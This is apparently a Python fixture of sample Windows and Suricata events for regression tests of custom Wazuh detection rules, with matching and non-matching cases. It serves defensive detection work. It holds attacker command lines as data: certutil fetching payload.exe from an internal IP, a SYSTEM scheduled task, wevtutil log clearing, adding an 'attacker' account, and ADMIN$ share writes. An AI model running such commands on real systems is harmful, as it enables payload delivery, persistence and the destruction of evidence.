"""Sample events for the rule regression tests.

Values are written the way Wazuh stores them for eventchannel logs: backslashes are
doubled, quotes in command lines are escaped as \\" and > and & are HTML escaped.
Most samples come straight from alerts in the evidence log. A few negative samples are
harmless variants of the same tools.

Each case: (rule id, fields, should the field patterns match?)
Only the <field> patterns of a rule are evaluated. Parent conditions such as if_group
and if_sid are not, so this does not replace wazuh-logtest.
"""

SYSTEMINFO = r"C:\\Windows\\System32\\systeminfo.exe"
SCHTASKS = r"C:\\Windows\\System32\\schtasks.exe"
WEVTUTIL = r"C:\\Windows\\System32\\wevtutil.exe"
TEMP = r"C:\\Users\\ADM~1.TRU\\AppData\\Local\\Temp\\lab-rename"

CASES = [
    # 100100 systeminfo.exe by image path
    ("100100", {"win.eventdata.image": SYSTEMINFO}, True),
    ("100100", {"win.eventdata.image": r"C:\\Tools\\notsysteminfo.exe"}, False),

    # 100101 renamed systeminfo.exe
    ("100101", {"win.eventdata.originalFileName": "sysinfo.exe",
                "win.eventdata.image": TEMP + r"\\sysq.exe"}, True),
    ("100101", {"win.eventdata.originalFileName": "sysinfo.exe",
                "win.eventdata.image": SYSTEMINFO}, False),
    ("100101", {"win.eventdata.originalFileName": "Cmd.Exe",
                "win.eventdata.image": r"C:\\Windows\\System32\\cmd.exe"}, False),

    # 100500 scheduled task creation, /create and -create
    ("100500", {"win.eventdata.image": SCHTASKS,
                "win.eventdata.commandLine": r'schtasks  /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"'}, True),
    ("100500", {"win.eventdata.image": SCHTASKS,
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\schtasks.exe\" -create /tn LabDash /tr \"cmd.exe /c calc.exe\" /sc once /st 23:59'}, True),
    ("100500", {"win.eventdata.image": SCHTASKS,
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\schtasks.exe\" /delete /tn LabDash /f'}, False),
    ("100500", {"win.eventdata.image": SCHTASKS,
                "win.eventdata.commandLine": "schtasks /query /fo LIST"}, False),

    # 100501 renamed schtasks.exe
    ("100501", {"win.eventdata.originalFileName": "schtasks.exe",
                "win.eventdata.image": TEMP + r"\\stq.exe",
                "win.eventdata.commandLine": r'\"' + TEMP + r'\\stq.exe\" -create /tn LabRename /tr \"cmd.exe /c calc.exe\" /sc once /st 23:59'}, True),
    ("100501", {"win.eventdata.originalFileName": "schtasks.exe",
                "win.eventdata.image": SCHTASKS,
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\schtasks.exe\" -create /tn LabDash /sc once'}, False),
    ("100501", {"win.eventdata.originalFileName": "schtasks.exe",
                "win.eventdata.image": TEMP + r"\\stq.exe",
                "win.eventdata.commandLine": r'\"' + TEMP + r'\\stq.exe\" /query'}, False),

    # 100550 and 100552 clearing logs with wevtutil
    ("100550", {"win.eventdata.image": WEVTUTIL,
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\wevtutil.exe\" cl Application'}, True),
    ("100550", {"win.eventdata.image": WEVTUTIL,
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\wevtutil.exe\" qe Application /c:1 /f:text'}, False),
    ("100552", {"win.eventdata.originalFileName": "wevtutil.exe",
                "win.eventdata.image": TEMP + r"\\wvq.exe",
                "win.eventdata.commandLine": r'\"' + TEMP + r'\\wvq.exe\" cl Application'}, True),
    ("100552", {"win.eventdata.originalFileName": "wevtutil.exe",
                "win.eventdata.image": WEVTUTIL,
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\wevtutil.exe\" cl Application'}, False),

    # 100600 and 100601 net.exe discovery. net localgroup users must not match 100600.
    ("100600", {"win.eventdata.image": r"C:\\Windows\\System32\\net1.exe",
                "win.eventdata.commandLine": r"C:\\WINDOWS\\system32\\net1 user"}, True),
    ("100600", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                "win.eventdata.commandLine": r'\"C:\\WINDOWS\\system32\\net.exe\" users'}, True),
    ("100600", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                "win.eventdata.commandLine": "net localgroup users"}, False),
    ("100600", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                "win.eventdata.commandLine": "net user attacker Passw0rd! /add"}, False),
    ("100601", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                "win.eventdata.commandLine": "net localgroup users"}, True),
    ("100601", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                "win.eventdata.commandLine": "net localgroup administrators"}, True),
    ("100601", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                "win.eventdata.commandLine": "net user"}, False),

    # 100602 and 100603
    ("100602", {"win.eventdata.image": r"C:\\Windows\\System32\\cmdkey.exe",
                "win.eventdata.commandLine": "cmdkey /list"}, True),
    ("100602", {"win.eventdata.image": r"C:\\Windows\\System32\\cmdkey.exe",
                "win.eventdata.commandLine": "cmdkey /add:server /user:u /pass:p"}, False),
    ("100603", {"win.eventdata.image": r"C:\\Windows\\System32\\query.exe",
                "win.eventdata.commandLine": "query user"}, True),
    ("100603", {"win.eventdata.image": r"C:\\Windows\\System32\\quser.exe",
                "win.eventdata.commandLine": "quser"}, True),
    ("100603", {"win.eventdata.image": r"C:\\Windows\\System32\\query.exe",
                "win.eventdata.commandLine": "query session"}, False),

    # 100700 and 100701 certutil downloads
    ("100700", {"win.eventdata.commandLine": r"certutil -urlcache -split -f http://10.10.50.181/payload.exe C:\\Users\\x\\payload.exe"}, True),
    ("100700", {"win.eventdata.commandLine": r'\"cmd.exe\" /c certutil.exe -verifyctl -split -f http://10.10.50.181/a.sst'}, True),
    ("100700", {"win.eventdata.commandLine": r"certutil -hashfile C:\\Windows\\System32\\cmd.exe SHA256"}, False),
    ("100701", {"win.eventdata.commandLine": r"certutil -urlcache -split -f http://10.10.50.181/payload.exe C:\\Users\\x\\payload.exe"}, True),

    # 100710 and 100711 administrative shares
    ("100710", {"win.eventdata.commandLine": r'\"cmd.exe\" /c cmd.exe /Q /c hostname 1&gt; \\\\127.0.0.1\\ADMIN$\\output.txt 2&gt;&amp;1'}, True),
    ("100710", {"win.eventdata.commandLine": r"net use \\\\10.10.20.10\\C$ /user:corp\\x"}, True),
    ("100710", {"win.eventdata.commandLine": r"copy a.txt \\\\fileserver\\public\\a.txt"}, False),
    ("100710", {"win.eventdata.commandLine": r"dir C:\\Users\\x\\Documents"}, False),
    ("100711", {"win.eventdata.commandLine": r'\"cmd.exe\" /c cmd.exe /Q /c hostname 1&gt; \\\\127.0.0.1\\ADMIN$\\output.txt 2&gt;&amp;1'}, True),

    # 100720 to 100722 wlrmdr.exe
    ("100720", {"win.eventdata.commandLine": r'\"powershell.exe\" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \\\"\"C:\\Windows\\System32\\calc.exe\\\"\"}'}, True),
    ("100720", {"win.eventdata.commandLine": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11"}, False),
    ("100721", {"win.eventdata.commandLine": r'\"powershell.exe\" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \\\"\"C:\\Windows\\System32\\calc.exe\\\"\"}'}, True),
    ("100722", {"win.eventdata.parentProcessName": r"C:\\Windows\\System32\\wlrmdr.exe"}, True),
    ("100722", {"win.eventdata.parentProcessName": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, False),

    # 100301 Suricata scan signatures
    ("100301", {"alert.signature": "ET SCAN Suspicious inbound to MSSQL port 1433"}, True),
    ("100301", {"alert.signature": "ET POLICY Possible Bitcoin Mining Pool Connection"}, False),

    # 100450 local account creation, domain name must not be CORP
    ("100450", {"win.system.eventID": "4720", "win.eventdata.targetDomainName": "WS01"}, True),
    ("100450", {"win.system.eventID": "4720", "win.eventdata.targetDomainName": "CORP"}, False),
    ("100450", {"win.system.eventID": "4722", "win.eventdata.targetDomainName": "WS01"}, False),
]
